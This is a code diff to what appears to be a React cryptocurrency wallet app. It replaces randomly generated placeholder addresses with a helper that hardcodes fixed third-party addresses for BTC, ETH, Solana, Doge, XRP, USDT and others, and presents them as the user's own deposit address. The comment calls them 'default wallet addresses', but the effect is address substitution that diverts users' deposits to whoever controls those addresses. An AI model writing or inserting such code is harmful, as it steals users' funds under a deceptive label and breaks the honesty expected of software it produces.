@@ -138,6 +138,23 @@ interface User {
   displayName: string;
 }
 
+// Default wallet addresses for popular cryptocurrencies
+const getDefaultWalletAddress = (symbol: string) => {
+  const defaultWallets = {
+    'btc': 'bc1qd2wec90rdvv7jgssl9uz859vrflqaprnvppetg',
+    'eth': '0x55db224bC13918664b57aC1B4d46fDA48E03818f',
+    'solana':'Fgo1begjZvZSVVSwcPPAG47b8YqLCSZKTf8jcSprqjub',
+    'polygon': '0x55db224bC13918664b57aC1B4d46fDA48E03818f',
+    'doge': 'D8d1YzJ5HyVMjRjqP1V8suyY6JqvbWPP9o',
+    'usdt': '0x742d35Cc6634C0532925a3b844Bc454e4438f44e',
+    'xrp': 'rP4t9Q4cMT6ECa68d3NVTW77q6gb4xY6f3',
+    'shib': '0x742d35Cc6634C0532925a3b844Bc454e4438f44e',
+    'usdc': '0x742d35Cc6634C0532925a3b844Bc454e4438f44e'
+  };
+  
+  return defaultWallets[symbol.toLowerCase()] || `0x${Math.random().toString(36).substring(2, 22)}${Math.random().toString(36).substring(2, 22)}`;
+};
+
 const TransferModal = ({ crypto, onClose }: { crypto: Cryptocurrency, onClose: () => void }) => {
   const [isCopied, setIsCopied] = useState(false);
   const { toast } = useToast();
@@ -600,7 +617,8 @@ const AddCryptoModal = ({
   };
 
   const handleAddCrypto = (crypto: CGCoin) => {
-    const randomAddress = `0x${Math.random().toString(36).substring(2, 22)}${Math.random().toString(36).substring(2, 22)}`;
+    // Use default wallet address for supported cryptocurrencies
+    const walletAddress = getDefaultWalletAddress(crypto.symbol);
     
     const newCrypto: Cryptocurrency = {
       id: crypto.id,
@@ -608,7 +626,7 @@ const AddCryptoModal = ({
       symbol: crypto.symbol,
       balance: 0,
       usdValue: 0,
-      address: randomAddress,
+      address: walletAddress,
       color: `#${Math.floor(Math.random()*16777215).toString(16)}`,
       change: crypto.price_change_percentage_24h || 0,
       isUp: (crypto.price_change_percentage_24h || 0) >= 0,
